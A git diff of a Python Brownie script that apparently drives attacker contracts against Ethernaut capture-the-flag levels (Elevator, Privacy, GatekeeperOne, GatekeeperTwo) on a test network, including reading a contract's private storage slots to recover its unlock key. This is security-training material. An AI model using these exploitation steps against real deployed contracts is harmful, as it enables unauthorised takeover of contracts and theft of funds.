@@ -1,12 +1,12 @@
 from brownie import Fallback, Fallout, CoinFlip, CoinFlipAttacker, Telephone, TelephoneAttacker, TokenThing, Delegation, Delegate, Force, network, config, accounts, Contract
-from brownie import AttackForce, Vault, King, AttackKing, Reentrance, AttackReentrancy
+from brownie import AttackForce, Vault, King, AttackKing, Reentrance, AttackReentrancy, Elevator, AttackElevator, Privacy
 from brownie.network.gas.strategies import GasNowStrategy
 from brownie.network import gas_price
 from scripts.helpful_scripts import *
 import time
 from web3.auto.infura import w3
 import os
-from brownie import Wei
+from brownie import Wei, AttackPrivacy, GatekeeperOne, AttackGatekeeperOne, GatekeeperTwo, AttackGatekeeperTwo
 
 
 
@@ -196,6 +196,67 @@ def deploy_reentrance():
     print(f"After attack...victim balance: {web3.fromWei(web3.eth.get_balance(reentrance.address), 'ether')}, attacker balance: {web3.fromWei(web3.eth.get_balance(attacker.address), 'ether')}")
     print(f"After attack...recursion count: {attacker.recursionCount()}")
 
+
+
+def deploy_elevator():
+    account = get_account()
+    elevator = deploy_contract(Elevator, "Elevator", 1, [])
+
+    attacker = AttackElevator.deploy(elevator.address, {"from": account.address}, publish_source=False)
+
+    print(f"Before the attack...top: {elevator.top()}, floor: {elevator.floor()}")
+    attacker.attack({"from":account.address}).wait(1)
+    print(f"After the attack...top: {elevator.top()}, floor: {elevator.floor()}")
+
+
+
+def deploy_privacy():
+    account = get_account()
+
+    privacy = deploy_contract(Privacy, "Privacy", 1, [])
+    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
+        print("Use forked!")
+        return
+
+    w3 = Web3(Web3.HTTPProvider(f"https://rinkeby.infura.io/v3/{os.getenv('WEB3_INFURA_PROJECT_ID')}"))
+
+    print(f"Connected? {w3.isConnected()}")
+    _dataArray = w3.eth.get_storage_at(privacy.address, 5) # get 6th variable
+    
+    # lets see all the memory slots (variables) for sanity
+    for i in range(0,6):
+        print(f"Slot {i}: {w3.eth.get_storage_at(privacy.address, i)}")
+
+    print(f"before attack...is locked?: {privacy.locked()}")
+    # _dataArray has our key within the highest-order bits since the EVM is little-endian
+    # instead of trying to convert a bytes32 to bytes16 in python we can just do it with another contract
+    attackPrivacy = AttackPrivacy.deploy(privacy.address, {"from":account.address}, publish_source=False)
+    attackPrivacy.unlock(_dataArray, {"from":account.address}).wait(1)
+    print(f"after attack...locked?: {privacy.locked()}")
+
+
+def deploy_gatekeeperone():
+    account = get_account()
+    # we use deploy_contract when it doesn't get deployed if an address is specified in the config
+    gatekeeperone = deploy_contract(GatekeeperOne, "GatekeeperOne", 1, [])
+
+    # we use Class.deploy when we always want to deploy a new contract
+    attacker = AttackGatekeeperOne.deploy(gatekeeperone.address, {"from":account.address}, publish_source=False)
+    print(f"Before attack...entrant: {gatekeeperone.entrant()}")
+    attacker.enter().wait(1)
+    print(f"After the attack...entrant: {gatekeeperone.entrant()}")
+
+def deploy_gatekeepertwo():
+    account = get_account()
+    gatekeepertwo = deploy_contract(GatekeeperTwo, "GatekeeperTwo", 1, [])
+    print(f"Before attack...entrant: {gatekeepertwo.entrant()}")
+    attacker = AttackGatekeeperTwo.deploy(gatekeepertwo.address, {"from":account.address}, publish_source=False)
+    print(f"After attack...entrant: {gatekeepertwo.entrant()}")
+
+
+
+
+
 ### NOTES
 ### deploy_contract is used for when the instance is either from address or deployed locally, depending on network
 ### ClassName.deploy() is used when we want to explicitly deploy it regardless of network
@@ -210,4 +271,8 @@ def main():
     #deploy_force()
     #deploy_vault()
     #deploy_king()
-    deploy_reentrance()
+    #deploy_reentrance()
+    #deploy_elevator()
+    #deploy_privacy()
+    #deploy_gatekeeperone()
+    deploy_gatekeepertwo()
